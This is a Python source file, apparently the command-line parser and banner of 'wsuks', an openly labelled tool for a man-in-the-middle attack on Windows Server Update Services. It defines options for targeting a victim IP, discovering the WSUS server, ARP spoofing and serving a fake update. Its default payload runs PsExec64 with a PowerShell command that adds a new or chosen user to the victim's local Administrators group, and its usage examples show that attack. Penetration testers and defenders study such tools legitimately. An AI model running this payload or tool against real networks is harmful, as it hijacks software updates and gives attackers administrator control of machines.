import argparse
from argparse import RawTextHelpFormatter
import importlib.metadata

import wsuks
from os.path import dirname
from termcolor import colored


VERSION = importlib.metadata.version("wsuks")


def printBanner():
    print(fr"""
    __          __ _____  _    _  _  __  _____
    \ \        / // ____|| |  | || |/ / / ____|
     \ \  /\  / /| (___  | |  | || ' / | (___
      \ \/  \/ /  \___ \ | |  | ||  <   \___ \
       \  /\  /   ____) || |__| || . \  ____) |
        \/  \/   |_____/  \____/ |_|\_\|_____/

     Pentesting Tool for the WSUS MITM Attack
               Made by NeffIsBack
                 {colored('version', 'red', attrs=['bold'])}: {colored(VERSION, 'yellow', attrs=['bold'])}
""")


def initParser():
    example_text = """Examples:
    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2                                    # Generates a new user&password and adds it to the local admin group
    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -d Domain.local            # Adds the domain user to the local admin group
    wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local --dc-ip 192.168.0.1   # Turns on WSUS server discovery and adds the domain user to the local admin group
    wsuks --serve-only                                                                 # Only run webserver to serve the executable and command
    """
    mode_parser = argparse.ArgumentParser(add_help=False)

    simple = mode_parser.add_argument_group("AUTOMATIC MODE", "Discover the WSUS Server automatically by searching for GPOs in SYSVOL. (Default)")
    simple.add_argument("-u", "--username", metavar="", help="Username to authenticate with")
    simple.add_argument("-p", "--password", metavar="", help="Password to authenticate with")
    simple.add_argument("--dc-ip", metavar="", dest="dcIp", help="IP Address of the domain controller")
    simple.add_argument("-d", "--domain", metavar="", help="Domain to authenticate with")
    simple.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication instead of NTLM")
    simple.add_argument("--dc-name", metavar="", dest="dcName", help="Domain Controller Name to authenticate with, required for Kerberos authentication")
    simple.add_argument("--only-discover", action="store_true", help="Only discover the WSUS Server and exit")

    advanced = mode_parser.add_argument_group("MANUAL MODE", "If you know the WSUS Server, you can use this mode to skip the automatic discovery.")
    advanced.add_argument("--WSUS-Server", metavar="", dest="wsusHost", help="IP or DNS name of the WSUS Server.")
    advanced.add_argument("--WSUS-Port", metavar="", dest="wsusPort", type=int, help="Port of the WSUS Server. (DEFAULT: 8530 for HTTP, 8531 for HTTPS)")
    advanced.add_argument("--tls-cert", metavar="", dest="tlsCert", help="Path to a TLS certificate that is valid for the WSUS Server. Turns on HTTPS mode.")

    webserver = mode_parser.add_argument_group("SERVE ONLY MODE", "Only run Webserver. Recommended if you have control over DNS and the traffic comes directly from the victim to your machine.")
    webserver.add_argument("--serve-only", action="store_true", help="Serve the executable and command without any arp spoofing, network magic or WSUS discovery.")
    mode_args = mode_parser.parse_known_args()[0]

    parser = argparse.ArgumentParser(prog="wsuks", epilog=example_text, parents=[mode_parser], formatter_class=RawTextHelpFormatter)
    parser.add_argument("-v", "--version", action="version", version=f"Current Version: wsuks {VERSION}")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    parser.add_argument("-ts", "--timestamp", action="store_true", help="Add timestamp to log messages")

    parser.add_argument("-t", "--target-ip", metavar="", dest="targetIp", help="IP Address of the victim Client.", required=not mode_args.serve_only and not mode_args.only_discover)
    parser.add_argument("-I", "--interface", metavar="", help="Network Interface to use. (DEFAULT: %(default)s)", default="eth0")
    parser.add_argument("-e", "--executable", metavar="", default=f"{dirname(wsuks.__file__)}/executables/PsExec64.exe", type=argparse.FileType("rb"), help="The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)")
    parser.add_argument("-c", "--command", metavar="", default='/accepteula /s powershell.exe "{CREATE_USER_COMMAND}Add-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member {WSUKS_USER};"', help="The command to execute on the victim. \n(DEFAULT (details see README): %(default)s)",)

    return parser.parse_args()
